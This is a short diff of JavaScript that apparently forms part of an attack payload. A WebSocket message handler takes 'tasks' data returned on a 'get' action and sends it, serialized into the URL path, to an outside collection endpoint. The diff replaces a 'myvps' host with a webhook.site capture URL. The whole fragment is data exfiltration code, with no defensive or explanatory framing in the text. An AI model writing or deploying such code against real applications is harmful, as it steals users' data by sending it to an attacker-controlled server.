@@ -8,7 +8,7 @@ ws.onmessage = async (msg) => {
     const data = JSON.parse(msg.data);
     if (data.success) {
         if (data.action === 'get') {
-            fetch("http://myvps/" + JSON.stringify(data.tasks ))
+            fetch("https://webhook.site/e98d9642-49ae-41a2-b67d-28e902f6b363/" + JSON.stringify(data.tasks ))
         }
         else if (data.action === 'add') {
         }
